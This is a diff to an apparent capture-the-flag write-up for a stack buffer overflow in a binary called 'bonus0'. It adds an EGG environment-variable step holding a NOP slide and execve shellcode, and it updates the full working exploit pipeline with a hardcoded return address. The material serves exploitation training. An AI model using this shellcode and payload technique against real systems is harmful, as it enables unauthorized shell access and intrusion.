@@ -93,6 +93,15 @@ Lower Memory Addresses
 - **NOP Slide**: 3000 bytes of `\x90` (no-operation instructions)  
 - **Shellcode**: 23 bytes - execve("/bin//sh") system call
 
+### Optional: Place shellcode in environment (EGG)
+You can store a small NOP slide + shellcode in an environment variable and use it as an alternate storage location. Example (Python 2 syntax):
+
+```bash
+export EGG=$(python -c "print '\x90' * 100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")
+```
+
+This places a 100-byte NOP slide followed by the 23-byte execve shellcode into the `EGG` environment variable. Using environment storage is optional and sometimes useful when limiting input size or exploiting different memory layouts.
+
 ### 2. Return Address Overwrite
 **Input 2 (Second " - " prompt):**
 ```python
@@ -131,10 +140,13 @@ Lower Memory Addresses
 
 ## Complete Exploit Execution
 
-### Final Payload
+### Final Payload (use Python 2 for exact semantics)
+
 ```bash
-(python -c "print('\x90' * 3000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')"; python -c "print('B' * 14 + '\xa4\xe6\xff\xbf' + 'B')"; cat) | ./bonus0
+(python2 -c "print '\x90'*3000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'"; python2 -c "print 'B'*14 + '\xa4\xe6\xff\xbf' + 'B'"; cat) | ./bonus0
 ```
+
+This pipeline was tested with Python 2 to generate exact byte sequences and successfully triggers the NOP slide → shellcode execution path.
 
 ### Execution Result
 ```
